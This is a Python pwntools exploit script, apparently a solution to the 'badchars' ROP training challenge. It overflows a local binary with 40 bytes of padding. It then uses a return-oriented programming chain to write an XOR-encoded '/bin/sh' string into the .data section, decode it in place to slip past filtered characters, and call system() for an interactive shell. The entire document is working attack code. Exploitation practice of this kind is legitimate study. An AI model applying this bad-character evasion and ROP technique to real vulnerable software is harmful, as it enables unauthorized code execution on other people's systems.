from pwn import *

def xorstring(toxor,key):
    retval = ""
    for letter in toxor:
        retval+= chr(ord(letter)^key)
    return retval

pr = process("./badchars")

# In order to get past the bad characters xor the /bin/sh string
key = 0xf6
binsh = xorstring("/bin/sh",key)
binsh += "\x00"

# Where we will be wrinting our string to
data = 0x601000

# for writing to data memory
pop_12_13_ret = p64(0x400b3b)
mov_a13_12 = p64(0x400b34)

# for xoring data
xor_a15_14 = p64(0x400b30)
pop15 = p64(0x400b42)
pop_14_15 = p64(0x400b40)
x_or = p64(key)

# for calling system
pop_rdi_ret = p64(0x400b39)
system = p64(0x4009e8)

# Gets us onto the stack proper
payload = "A"*40

# Gets our /bin/sh into .data
payload += pop_12_13_ret + binsh + p64(data) + mov_a13_12

# Xor the string in data
payload += pop_14_15 + x_or + p64(data)
for i in range(len(binsh)-1):
    payload += pop15 + p64(data+i) + xor_a15_14

# call system with our string in data as the param
payload += pop_rdi_ret + p64(data)+ system

# win
pr.sendline(payload)
pr.interactive()
